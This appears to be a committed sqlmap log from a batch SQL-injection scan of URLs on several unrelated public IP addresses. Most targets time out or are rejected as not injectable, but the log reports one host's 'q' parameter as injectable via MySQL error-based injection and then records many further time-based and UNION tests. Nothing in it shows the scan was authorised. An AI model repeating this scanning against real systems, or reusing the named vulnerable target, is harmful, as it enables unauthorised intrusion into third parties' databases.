+do you want to test this URL? [Y/n/q]
+> Y
+[11:45:44] [INFO] testing URL 'http://75.112.206.117//?X=dis'
+[11:45:44] [INFO] testing connection to the target URL
+[11:45:46] [INFO] heuristics detected web page charset 'ascii'
+[11:45:46] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:45:51] [INFO] testing if the target URL is stable
+[11:45:56] [INFO] target URL is stable
+[11:45:56] [INFO] testing if GET parameter 'X' is dynamic
+[11:45:58] [INFO] confirming that GET parameter 'X' is dynamic
+[11:45:59] [INFO] GET parameter 'X' is dynamic
+[11:46:00] [WARNING] heuristic (basic) test shows that GET parameter 'X' might not be injectable
+[11:46:04] [INFO] skipping GET parameter 'X'
+[11:46:04] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 72:
+GET http://66.240.188.179/Home//Home?lang=fr
+do you want to test this URL? [Y/n/q]
+> Y
+[11:46:04] [INFO] testing URL 'http://66.240.188.179/Home//Home?lang=fr'
+[11:46:04] [INFO] testing connection to the target URL
+[11:46:07] [CRITICAL] page not found (404)
+[11:46:07] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+URL 73:
+GET http://50.62.216.46//?format=feed&type=rss
+do you want to test this URL? [Y/n/q]
+> Y
+[11:46:07] [INFO] testing URL 'http://50.62.216.46//?format=feed&type=rss'
+[11:46:07] [INFO] testing connection to the target URL
+[11:46:18] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)
+[11:46:18] [WARNING] if the problem persists please check that the provided target URL is valid. In case that it is, you can try to rerun with the switch '--random-agent' turned on and/or proxy switches ('--ignore-proxy', '--proxy',...)
+[11:46:48] [ERROR] connection timed out to the target URL or proxy, skipping to the next URL
+URL 74:
+GET http://52.201.83.170/login?from=%2F//login?from=%2F
+do you want to test this URL? [Y/n/q]
+> Y
+[11:46:48] [INFO] testing URL 'http://52.201.83.170/login?from=%2F//login?from=%2F'
+it appears that provided value for GET parameter 'from' has boundaries. Do you want to inject inside? ('///login?from*=/') [y/N] N
+[11:46:48] [INFO] testing connection to the target URL
+[11:46:49] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:46:49] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:46:49] [INFO] testing if the target URL is stable
+[11:46:50] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[11:46:50] [INFO] testing if GET parameter 'from' is dynamic
+[11:46:50] [WARNING] GET parameter 'from' does not appear dynamic
+[11:46:51] [WARNING] heuristic (basic) test shows that GET parameter 'from' might not be injectable
+[11:46:52] [INFO] skipping GET parameter 'from'
+[11:46:52] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Please retry with the switch '--text-only' (along with --technique=BU) as this case looks like a perfect candidate (low textual content along with inability of comparison engine to detect at least one dynamic parameter). Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 75:
+GET http://140.111.1.215//BulletinBoard/CheckData?sno=1415&MergedId=a0b4dbc1d1f14c24bcedaacb5f4be8db
+do you want to test this URL? [Y/n/q]
+> Y
+[11:46:52] [INFO] testing URL 'http://140.111.1.215//BulletinBoard/CheckData?sno=1415&MergedId=a0b4dbc1d1f14c24bcedaacb5f4be8db'
+[11:46:52] [INFO] testing connection to the target URL
+[11:46:53] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:46:53] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:47:03] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
+do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] N
+[11:47:03] [INFO] testing if the target URL is stable
+[11:47:03] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[11:47:03] [INFO] testing if GET parameter 'sno' is dynamic
+[11:47:03] [INFO] confirming that GET parameter 'sno' is dynamic
+[11:47:04] [INFO] GET parameter 'sno' is dynamic
+[11:47:05] [WARNING] heuristic (basic) test shows that GET parameter 'sno' might not be injectable
+[11:47:05] [INFO] skipping GET parameter 'sno'
+[11:47:05] [INFO] testing if GET parameter 'MergedId' is dynamic
+[11:47:06] [WARNING] GET parameter 'MergedId' does not appear dynamic
+[11:47:06] [WARNING] heuristic (basic) test shows that GET parameter 'MergedId' might not be injectable
+[11:47:07] [INFO] skipping GET parameter 'MergedId'
+[11:47:07] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Please retry with the switch '--text-only' (along with --technique=BU) as this case looks like a perfect candidate (low textual content along with inability of comparison engine to detect at least one dynamic parameter). Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+URL 76:
+GET http://154.57.230.162//?q=user/register
+do you want to test this URL? [Y/n/q]
+> Y
+[11:47:07] [INFO] testing URL 'http://154.57.230.162//?q=user/register'
+[11:47:07] [INFO] testing connection to the target URL
+[11:47:08] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+[11:47:08] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[11:47:09] [WARNING] reflective value(s) found and filtering out
+[11:47:09] [INFO] testing if the target URL is stable
+[11:47:10] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[11:47:10] [INFO] testing if GET parameter 'q' is dynamic
+[11:47:10] [INFO] confirming that GET parameter 'q' is dynamic
+[11:47:11] [INFO] GET parameter 'q' is dynamic
+[11:47:13] [INFO] heuristic (basic) test shows that GET parameter 'q' might be injectable (possible DBMS: 'MySQL')
+[11:47:14] [INFO] testing for SQL injection on GET parameter 'q'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[11:47:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[11:47:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[11:48:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[11:49:42] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)'
+[11:50:45] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[11:51:20] [WARNING] there is a possibility that the target (or WAF) is dropping 'suspicious' requests
+[11:51:20] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)
+[11:51:20] [WARNING] if the problem persists please try to lower the number of used threads (option '--threads')
+[11:52:00] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)
+[11:52:25] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)
+[11:52:42] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)
+[11:52:57] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)
+[11:53:35] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)
+[11:54:12] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)
+[11:55:18] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[11:56:55] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[11:58:00] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[11:59:23] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[12:00:40] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
+[12:02:26] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
+[12:03:30] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
+[12:03:31] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace (original value)'
+[12:03:32] [INFO] testing 'MySQL < 5.0 boolean-based blind - Parameter replace'
+[12:03:34] [INFO] testing 'MySQL < 5.0 boolean-based blind - Parameter replace (original value)'
+[12:03:36] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
+[12:03:37] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
+[12:03:38] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
+[12:03:40] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
+[12:03:41] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
+[12:03:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
+[12:03:44] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[12:03:47] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[12:03:50] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[12:03:56] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[12:03:59] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
+[12:05:16] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)
+[12:05:23] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
+[12:07:15] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[12:07:26] [INFO] GET parameter 'q' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
+[12:07:26] [INFO] testing 'MySQL inline queries'
+[12:07:27] [INFO] testing 'MySQL > 5.0.11 stacked queries (SLEEP - comment)'
+[12:07:27] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+[12:07:28] [INFO] testing 'MySQL > 5.0.11 stacked queries (SLEEP)'
+[12:07:28] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
+[12:07:29] [INFO] testing 'MySQL > 5.0.11 stacked queries'
+[12:07:30] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
+[12:07:31] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+[12:07:31] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[12:07:42] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
+[12:07:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
+[12:07:54] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
+[12:08:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[12:08:00] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind'
+[12:08:01] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (comment)'
+[12:08:02] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (comment)'
+[12:08:02] [INFO] testing 'MySQL <= 5.0.11 AND time-based blind (heavy query)'
+[12:08:03] [INFO] testing 'MySQL <= 5.0.11 OR time-based blind (heavy query)'
+[12:08:04] [INFO] testing 'MySQL <= 5.0.11 AND time-based blind (heavy query - comment)'
+[12:08:09] [INFO] testing 'MySQL <= 5.0.11 OR time-based blind (heavy query - comment)'
+[12:08:10] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (SLEEP)'
+[12:08:16] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (SLEEP - comment)'
+[12:08:23] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
+[12:08:24] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
+[12:08:25] [INFO] testing 'MySQL AND time-based blind (ELT)'
+[12:08:25] [INFO] testing 'MySQL OR time-based blind (ELT)'
+[12:08:26] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
+[12:08:27] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
+[12:08:28] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[12:08:28] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[12:08:29] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
+[12:08:30] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (SLEEP)'
+[12:08:30] [INFO] testing 'MySQL <= 5.0.11 time-based blind - Parameter replace (heavy queries)'
+[12:08:31] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
+[12:08:32] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
+[12:08:32] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
+[12:08:33] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
+[12:08:39] [INFO] testing 'MySQL <= 5.0.11 time-based blind - ORDER BY, GROUP BY clause (heavy query)'
+[12:08:40] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[12:08:40] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[12:08:57] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[12:09:16] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
